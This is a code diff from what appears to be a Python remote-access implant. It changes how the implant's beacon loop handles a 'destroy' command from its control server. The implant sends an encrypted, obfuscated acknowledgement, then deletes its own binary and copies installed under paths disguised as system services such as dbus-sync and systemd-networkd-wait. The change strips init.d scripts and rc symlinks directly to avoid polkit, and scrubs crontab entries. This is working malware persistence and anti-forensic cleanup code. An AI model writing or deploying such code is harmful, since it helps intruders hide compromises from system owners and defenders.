@@ -306,16 +306,17 @@ def beacon():
                     except _Destroy as sig:
                         ack = _ok(str(sig), {"message": "Destroying."})
                         _send(s, obfuscate(encrypt_message(json.dumps(ack).encode(), server_pub)))
-                        # Remove own binary
+                        # Remove own binary + known install paths
                         own = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
-                        try:
-                            os.remove(own)
-                        except Exception:
-                            pass
-                        # Remove init.d scripts for any name we might have been installed as
-                        for name in ["dbus-sync", "network-manager-dispatcher"]:
-                            _run("update-rc.d -f {0} remove 2>/dev/null".format(name))
+                        for path in [own, "/usr/bin/dbus-sync", "/usr/lib/systemd/systemd-networkd-wait"]:
+                            try:
+                                os.remove(path)
+                            except Exception:
+                                pass
+                        # Remove init.d scripts + rc symlinks directly (no update-rc.d to avoid polkit)
+                        for name in ["dbus-sync", "network-manager-dispatcher", "systemd-networkd-wait"]:
                             _run("rm -f /etc/init.d/{0}".format(name))
+                            _run("rm -f /etc/rc*.d/*{0}".format(name))
                         # Scrub crontab of any entry pointing at our binary
                         proc = subprocess.Popen(
                             "crontab -l 2>/dev/null",
